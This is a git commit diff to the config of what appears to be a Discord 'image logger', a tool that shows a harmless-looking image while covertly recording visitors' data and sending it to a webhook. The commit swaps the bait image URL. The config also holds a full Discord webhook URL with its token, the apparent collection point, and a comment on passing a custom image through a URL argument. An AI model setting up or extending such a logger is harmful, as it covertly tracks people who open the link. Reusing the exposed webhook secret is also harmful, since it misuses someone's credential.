f1cf4fb97a8b0a8d08a693d6c8d6fbbca234edac
hamzabadina-hash <hamzabadina@gmail.com>
2026-03-19 23:23:32 +0000

    Update main.py

--- api/main.py
+++ api/main.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1484326843996962889/qhvlNQwqYLoefUqIdwLwCSCJtv8sVypxwnd6V4FXYpbpmwFgiD5FYP3fZq17EzHCUxNk",
-    "image": "https://media.tenor.com/xiA7X4kN5AAAAAAi/baller-baller-meme.gif", # You can also have a custom image by using a URL argument
+    "image": "https://i.pinimg.com/736x/df/96/d8/df96d84e03317bba5b9961e75382ec37.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
